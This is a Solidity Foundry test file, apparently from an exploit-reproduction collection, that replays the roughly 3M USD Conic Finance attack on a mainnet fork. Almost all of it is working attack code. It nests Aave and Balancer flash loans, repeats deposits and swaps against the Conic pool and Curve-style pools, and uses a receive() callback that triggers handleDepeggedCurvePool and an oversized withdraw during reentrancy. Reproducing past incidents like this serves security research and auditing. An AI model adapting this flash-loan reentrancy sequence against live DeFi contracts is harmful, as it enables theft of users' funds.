// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~3M USD$
// Attacker : https://etherscan.io/address/0x8d67db0b205e32a5dd96145f022fa18aae7dc8aa
// Attack Contract : https://etherscan.io/address/0x743599ba5cfa3ce8c59691af5ef279aaafa2e4eb
// Vulnerable Contract : https://etherscan.io/address/0xbb787d6243a8d450659e09ea6fd82f1c859691e9
// Attack Tx : https://etherscan.io/tx/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146

// @Analysis
// https://twitter.com/BlockSecTeam/status/1682346827939717120

interface IConic {
    function deposit(uint256 underlyingAmount, uint256 minLpReceived, bool stake) external returns (uint256);

    function handleDepeggedCurvePool(address curvePool_) external;

    function withdraw(uint256 conicLpAmount, uint256 minUnderlyingReceived) external returns (uint256);
}

contract ConicFinanceTest is Test {
    IWETH WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 rETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IERC20 cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
    IERC20 steCRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 cbETH_ETHf = IERC20(0x5b6C539b224014A09B3388e51CaAA8e354c959C8);
    IERC20 rETH_ETHf = IERC20(0x6c38cE8984a890F5e46e6dF6117C26b3F1EcfC9C);
    IERC20 cncETH = IERC20(0x3565A68666FD3A6361F06f84637E805b727b4A47);
    IBalancerVault BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAaveFlashloan AaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IConic ConicPool = IConic(0xBb787d6243a8D450659E09ea6fD82F1C859691e9);
    address private constant lidoPool = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
    address private constant vyperContract1 = 0x0f3159811670c117c372428D4E69AC32325e4D0F;
    address private constant vyperContract2 = 0x5FAE7E604FC3e24fd43A72867ceBaC94c65b404A;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_740_954);
        cheats.label(address(WETH), "WETH");
        cheats.label(address(rETH), "rETH");
        cheats.label(address(stETH), "stETH");
        cheats.label(address(cbETH), "cbETH");
        cheats.label(address(steCRV), "steCRV");
        cheats.label(address(cbETH_ETHf), "cbETH_ETHf");
        cheats.label(address(rETH_ETHf), "rETH_ETHf");
        cheats.label(address(cncETH), "cncETH");
        cheats.label(address(BalancerVault), "BalancerVault");
        cheats.label(address(AaveV2), "AaveV2");
        cheats.label(address(AaveV3), "AaveV3");
        cheats.label(address(ConicPool), "ConicPool");
        cheats.label(lidoPool, "Lido");
        cheats.label(vyperContract1, "vyperContract1");
        cheats.label(vyperContract2, "vyperContract2");
    }

    function testExploit() public {
        deal(address(this), 0 ether);
        emit log_named_decimal_uint("Attacker balance of ETH before exploit", address(this).balance, 18);
        WETH.approve(vyperContract1, type(uint256).max);
        rETH.approve(vyperContract1, type(uint256).max);
        WETH.approve(lidoPool, type(uint256).max);
        stETH.approve(lidoPool, type(uint256).max);
        WETH.approve(vyperContract2, type(uint256).max);
        cbETH.approve(vyperContract2, type(uint256).max);
        WETH.approve(address(ConicPool), type(uint256).max);
        cbETH.approve(address(AaveV3), type(uint256).max);
        stETH.approve(address(AaveV2), type(uint256).max);

        address[] memory assets = new address[](1);
        assets[0] = address(stETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 20_000 * 1e18;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
        exchangeVyper(vyperContract2, cbETH.balanceOf(address(this)), 1, 0);
        exchangeLidoStETH();
        exchangeVyper(vyperContract1, rETH.balanceOf(address(this)), 1, 0);
        WETH.withdraw(WETH.balanceOf(address(this)));
        emit log_named_decimal_uint("Attacker balance of ETH after exploit", address(this).balance, 18);
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) external returns (bool) {
        AaveV3.flashLoanSimple(address(this), address(cbETH), 850e18, bytes(""), 0);
        return true;
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes memory params
    ) external returns (bool) {
        address[] memory tokens = new address[](3);
        tokens[0] = address(rETH);
        tokens[1] = address(cbETH);
        tokens[2] = address(WETH);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 20_550 * 1e18;
        amounts[1] = 3000 * 1e18;
        amounts[2] = 28_504_200 * 1e15;
        BalancerVault.flashLoan(address(this), tokens, amounts, bytes(""));
        return true;
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        for (uint256 i; i < 7; i++) {
            depositAndExchange(121e18, 1, 0);
        }
        WETH.withdraw(20_000 * 1e18);
        addLiquidityToLido();
        removeLiquidityFromLido();
        WETH.withdraw(WETH.balanceOf(address(this)) - 4200 * 1e15);
        interactWithVyperContract2();
        interactWithVyperContract1();
        exchangeVyper(vyperContract2, 850e18, 0, 1);
        ConicPool.withdraw(cncETH.balanceOf(address(this)), 0);
        WETH.deposit{value: address(this).balance}();
        exchangeVyper(vyperContract1, 1100 * 1e18, 0, 1);
        WETH.withdraw(300e18);
        exchangeLidoWETH();
        // Repay flashloan
        rETH.transfer(address(BalancerVault), 20_550 * 1e18);
        cbETH.transfer(address(BalancerVault), 3000 * 1e18);
        WETH.transfer(address(BalancerVault), 28_504_200 * 1e15);
    }

    receive() external payable {
        if (msg.sender == lidoPool && msg.value > 20_000 * 1e18) {
            ConicPool.handleDepeggedCurvePool(lidoPool);
        } else if (msg.sender == vyperContract2) {
            ConicPool.handleDepeggedCurvePool(vyperContract2);
        } else if (msg.sender == vyperContract1) {
            // Exploit
            ConicPool.withdraw(6_292_026 * 1e15, 0);
        }
    }

    function depositAndExchange(uint256 dx, uint256 i, uint256 j) internal {
        ConicPool.deposit(1214 * 1e18, 0, false);
        exchangeVyper(vyperContract2, dx, i, j);
        exchangeVyper(vyperContract1, dx, i, j);
    }

    function exchangeVyper(address contractAddr, uint256 dx, uint256 i, uint256 j) internal {
        (bool success,) =
            contractAddr.call(abi.encodeWithSelector(bytes4(0xce7d6503), i, j, dx, 0, false, address(this)));
        require(success, "Exchange Vyper not successful");
    }

    function exchangeLidoWETH() internal {
        (bool success,) = lidoPool.call{value: 300 ether}(abi.encodeWithSelector(bytes4(0x3df02124), 0, 1, 300e18, 0));
        require(success, "Exchange Lido not successful");
    }

    function exchangeLidoStETH() internal {
        (bool success,) =
            lidoPool.call(abi.encodeWithSelector(bytes4(0x3df02124), 1, 0, stETH.balanceOf(address(this)), 0));
        require(success, "Exchange Lido not successful");
    }

    function addLiquidityToLido() internal {
        (bool success,) = lidoPool.call{value: 20_000 ether}(
            abi.encodeWithSelector(bytes4(0x0b4c7e4d), [20_000 * 1e18, stETH.balanceOf(address(this))], 0)
        );
        require(success, "Add liquidity to Lido not successful");
    }

    function addLiquidityToVyperContract(address vyperContract, uint256 amount1, uint256 amount2) internal {
        (bool success,) =
            vyperContract.call(abi.encodeWithSelector(bytes4(0x7328333b), [amount1, amount2], 0, false, address(this)));
        require(success, "Add liquidity to Vyper contract not successful");
    }

    function removeLiquidityFromLido() internal {
        (bool success,) =
            lidoPool.call(abi.encodeWithSelector(bytes4(0x5b36389c), steCRV.balanceOf(address(this)), [0, 0]));
        require(success, "Remove liquidity from Lido not successful");
    }

    function removeLiquidityFromVyperContract(address vyperContract, uint256 amount) internal {
        (bool success,) =
            vyperContract.call(abi.encodeWithSelector(bytes4(0x1808e84a), amount, [0, 0], true, address(this)));
        require(success, "Remove liquidity from Vyper contract not successful");
    }

    function interactWithVyperContract2() internal {
        exchangeVyper(vyperContract2, cbETH.balanceOf(address(this)), 1, 0);
        addLiquidityToVyperContract(vyperContract2, 1800 * 1e15, 0);
        removeLiquidityFromVyperContract(vyperContract2, cbETH_ETHf.balanceOf(address(this)));
        exchangeVyper(vyperContract2, WETH.balanceOf(address(this)) - 10e18, 0, 1);
    }

    function interactWithVyperContract1() internal {
        exchangeVyper(vyperContract1, rETH.balanceOf(address(this)), 1, 0);
        addLiquidityToVyperContract(vyperContract1, 2400 * 1e15, 0);
        removeLiquidityFromVyperContract(vyperContract1, rETH_ETHf.balanceOf(address(this)));
        exchangeVyper(vyperContract1, 3_425_879_111_748_706_429_367, 0, 1);
    }
}
